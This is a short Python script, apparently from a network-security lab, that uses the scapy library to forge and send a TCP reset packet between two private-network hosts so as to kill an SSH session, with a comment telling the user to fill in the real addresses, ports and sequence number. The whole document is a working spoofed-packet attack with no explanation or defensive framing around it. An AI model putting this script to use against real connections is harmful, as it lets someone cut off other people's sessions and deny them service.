#!/usr/bin/python3
import sys
from scapy.all import *

print("SENDING RESET PACKET.........")
IPLayer = IP(src="10.0.2.6", dst="10.0.2.5")  #need to update src dst port seq accordingly. 
TCPLayer = TCP(sport=22, dport=32852,flags="R", seq=1330047376)
pkt = IPLayer/TCPLayer
ls(pkt)
send(pkt, verbose=0)

